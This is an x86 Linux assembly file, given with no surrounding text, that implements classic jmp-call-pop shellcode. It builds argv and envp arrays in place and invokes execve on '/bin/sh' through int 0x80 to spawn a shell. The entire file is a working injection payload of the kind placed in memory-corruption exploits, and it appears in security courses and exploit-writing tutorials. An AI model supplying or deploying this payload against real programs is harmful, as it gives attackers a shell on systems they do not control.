[SECTION .text]

    global _start

_start:
    jmp short ender

starter:

    pop ebx
    xor eax, eax

    mov [ebx + 7], al
    mov [ebx + 8], ebx

    mov [ebx + 12], eax
    mov al, 11
    lea ecx, [ebx + 8]
    lea edx, [ebx + 12]
    int 0x80

ender:
    call starter
    db '/bin/shNAAAABBBB'
